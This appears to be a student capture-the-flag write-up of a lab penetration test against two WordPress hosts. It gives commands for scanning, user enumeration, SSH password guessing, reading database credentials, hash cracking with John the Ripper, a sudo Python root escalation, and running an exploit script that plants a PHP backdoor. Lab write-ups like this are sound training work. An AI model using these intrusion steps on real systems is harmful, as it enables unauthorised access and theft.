# Read Team: Summary of Operations

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

Command: nmap -sV 192.168.1.110

Output Screenshot:

![Nmap scan results](/Images/nmap-scan-results.png "Nmap scan results")

This scan identifies the services below as potential points of entry:

**Target 1 and Target 2**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of User Privileges/Privilege Escalation

### Explotation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**
- Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`

![WPScan results](/Images/wordpress-scan-results.png "WPScan results")

- Targeting user: Michael
    - Small manual guess finds Michael’s password
    - User password was weak and easy to guess
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`

![Flag 1 location](/Images/flag1-location.png "Flag 1 location")

- **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to gain Flag 1.
    - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
        - Once again changing through directories and files as before 
        - Flag 2 was found in /var/www next
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd ../` 
            - `cd ../`
            - `cd var/www`
            - `ls`
            - `cat flag2.txt`

![Flag 2 location](/Images/flag2-location.png "Flag 2 location")

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Capturing Flag 3: Accessing MySQL database.
        - After locating wp-config.php in /var/www/html/wordpress and gaining access to the database credentials as Michael, MySQL was used to explore the database.
        - The data base credentials are user: root and password: R@v3nSecurity
        - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

![Database Credentials](/Images/mysql-user-and-pass.png "Database Credentials")

![Flag 3 location](/Images/flag3-location.png "Flag 3 location")

Flag 4, which was supposed to be found another way, was also here

![Flag 4 location](/Images/flag4.png "Flag 4 location")

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with a Python vulnerability.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - ![wp_users table](/Images/user-hashes.png "wp_users table")

        - On the Kali local machine after storing the found hashes in wp_hashes.txt the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls`
                - `cat flag4.txt`

![Flag 4 location](/Images/flag4-location.png "Flag 4 location")


The Red Team was able to penetrate Target 2 and retrieve the following confidential data:

**Target 2**
**Flag1: a2c1f66d2b8051bd3a5874b5b6e43e21**
- Exploit Used:
    - Gobuster to enumerate hidden directories of the Target 2 WordPress site
    - Command: 
        - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115`
    - Results: Found the /vendor path which lead to finding flag 1:

![Flag 1 location](/Images/flag-1-target-2.png "Flag 1 location")


**Flag2: 49d50de0b97ef39a4dabcc8490af17fa**
- Exploit Used
    - Ran script "exploit.sh" to create a backdoor.php on the target server which can be used to execute command injection attacks. 
    - Command:
        - './exploit.sh'
    - Results: Used the injection attack to find path var/www/flag2.txt

![Flag 2 location](/Images/flag2-target2.png "Flag 2 location")

- **Flag3: a0f568aa9de277887f37730d71520d9b**
- Exploit Used:
    - WPScan to enumerate vulnerable plugins of the Target 2 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110/wordpress --enumerate vp`
    - Results: Returned a hidden "wp-content" directory, found flag 3 in /wordpress/wp-content/uploads/2018/11/flag3.png

![Flag 3 location](/Images/flag-3-target-2.png "Flag 3 Location")
